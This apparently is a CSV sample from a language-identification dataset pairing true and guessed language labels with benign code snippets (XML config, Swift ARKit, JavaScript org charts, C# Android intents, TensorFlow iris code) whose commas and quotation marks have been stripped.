correct,guess,snippet
XML,xml,"<?xml version=1.0?><DevelopmentStorage xmlns:xsd=http://www.w3.org/2001/XMLSchema xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance version=2009-03-18>  <SQLInstance>(localdb)\v11.0</SQLInstance>  <PageBlobRoot>C:\Users\Carl\AppData\Local\DevelopmentStorage\PageBlobRoot</PageBlobRoot>  <BlockBlobRoot>C:\Users\Carl\AppData\Local\DevelopmentStorage\BlockBlobRoot</BlockBlobRoot>  <LogPath>C:\Users\Carl\AppData\Local\DevelopmentStorage\Logs</LogPath>  <LoggingEnabled>false</LoggingEnabled></DevelopmentStorage>"
Swift,swift,"@objc func handleTap(sender: UITapGestureRecognizer) {    if let tappedSceneView = sender.view as? ARSCNView {        let tapLocationInView = sender.location(in: tappedSceneView)        let planeHitTest = tappedSceneView.hitTest(tapLocationInView            types: .existingPlaneUsingExtent)        if !planeHitTest.isEmpty {            addFurniture(hitTest: planeHitTest)        }    }}"
JavaScript,javascript,"var my_dataset = [   {       id: 1       text: Chairman & CEO       title: Henry Bennett   }   {       id: 2       text: Manager       title: Mildred Kim   }   {       id: 3       text: Technical Director       title: Jerry Wagner   }   { id: 1-2 from: 1 to: 2 type: line }   { id: 1-3 from: 1 to: 3 type: line }];"
Javascript,javascript,"var my_dataset = [              {           id: 1           text: Chairman & CEO           color: #673AB7           css: myStyle       }       {           id: 2           text: Manager           color: #E91E63       }       {           id: 3           text: Technical Director           color: #9C27B0           width: 200       }       {           id: 1-2           from: 1           to: 2           css: myConnector           type: line       }       {           id: 1-3           from: 1           to: 3           type: line       }   ]"
Javascript,javascript,"var my_dataset = [       {          id: 1          text: item: 1       }       {          id: 2          text: item: 2          parent: 1          dir: vertical       }       {          id: 3          text: item: 3          parent: 14       }       {          id: 7          text: item: 7          parent: 14       }       {          id: 14          text: item: 14          parent: 2       }       {          id: 19          text: item: 19          parent: 2       }];"
C#,c#,"    public class AppIntents_Droid : IAppIntents    {        public void HandleWebviewUri(string uri)        {            var appUri = Android.Net.Uri.Parse(uri);            var appIntent = new Intent(Intent.ActionView appUri);            Application.Context.StartActivity(appIntent);        }    }"
Python,python,"# Import `tensorflow` and `pandas`import tensorflow as tfimport pandas as pdCOLUMN_NAMES = [        'SepalLength'         'SepalWidth'        'PetalLength'         'PetalWidth'         'Species'        ]# Import training datasettraining_dataset = pd.read_csv('iris_training.csv' names=COLUMN_NAMES header=0)train_x = training_dataset.iloc[: 0:4]train_y = training_dataset.iloc[: 4]# Import testing datasettest_dataset = pd.read_csv('iris_test.csv' names=COLUMN_NAMES header=0)test_x = test_dataset.iloc[: 0:4]test_y = test_dataset.iloc[: 4]"
Python,python,"# Setup feature columnscolumns_feat = [    tf.feature_column.numeric_column(key='SepalLength')    tf.feature_column.numeric_column(key='SepalWidth')    tf.feature_column.numeric_column(key='PetalLength')    tf.feature_column.numeric_column(key='PetalWidth')]"
Python,python,"# Define train functiondef train_function(inputs outputs batch_size):    dataset = tf.data.Dataset.from_tensor_slices((dict(inputs) outputs))    dataset = dataset.shuffle(1000).repeat().batch(batch_size)    return dataset.make_one_shot_iterator().get_next()# Train the Model.classifier.train(    input_fn=lambda:train_function(train_x train_y 100)    steps=1000)"
Python,python,"# Define evaluation functiondef evaluation_function(attributes classes batch_size):    attributes=dict(attributes)    if classes is None:        inputs = attributes    else:        inputs = (attributes classes)    dataset = tf.data.Dataset.from_tensor_slices(inputs)    assert batch_size is not None batch_size must not be None    dataset = dataset.batch(batch_size)    return dataset.make_one_shot_iterator().get_next()# Evaluate the model.eval_result = classifier.evaluate(    input_fn=lambda:evaluation_function(test_x test_y 100))"
